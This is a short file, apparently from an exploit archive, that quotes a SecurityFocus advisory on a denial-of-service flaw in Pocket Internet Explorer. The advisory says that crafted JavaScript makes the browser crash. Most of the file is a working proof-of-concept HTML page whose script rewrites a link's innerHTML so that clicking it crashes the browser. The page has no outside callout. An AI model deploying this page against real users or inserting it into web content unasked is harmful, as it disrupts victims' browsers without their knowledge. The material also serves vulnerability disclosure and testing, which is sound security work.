@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/6507/info
+
+A denial of service vulnerability has been reported for Pocket Internet Explorer (PIE). The vulnerability is due to the way some JavaScript code is interpreted by PIE.
+
+By enticing a victim user to browse a maliciously crafted web page an attacker can cause PIE to crash. 
+
+<html> <head>
+<script language="Javascript">
+function displayPage(page){
+if(page=="onload"){
+main.innerHTML="<a href=\"#\" onClick=\"displayPage('crash');\">Crash
+me</a>";}
+if(page=="crash"){
+main.innerHTML="<a href=\"#\" onClick=\"displayPage('crash');\">crash!</a>";}
+}
+</script> </head>
+<body onLoad="displayPage('onload');"> <hr> <span id="main"></span> </body> </html> 
